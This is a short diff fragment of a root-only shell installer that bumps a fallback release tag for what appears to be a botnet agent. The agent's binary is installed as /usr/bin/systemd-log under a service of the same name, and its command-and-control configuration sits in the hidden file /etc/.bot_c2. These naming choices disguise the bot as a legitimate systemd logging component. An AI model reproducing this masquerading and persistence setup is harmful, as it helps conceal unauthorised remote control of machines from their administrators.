@@ -20,7 +20,7 @@ BOT_PATH="/usr/bin/systemd-log"
 C2_CFG="/etc/.bot_c2"
 SERVICE_NAME="systemd-log"
 # Optional pin: BOT_TAG=v4.0.6
-FALLBACK_TAG="${BOT_TAG:-v4.0.18}"
+FALLBACK_TAG="${BOT_TAG:-v4.0.19}"
 
 if [ "$(id -u)" -ne 0 ]; then
     err "Must run as root (sudo)."
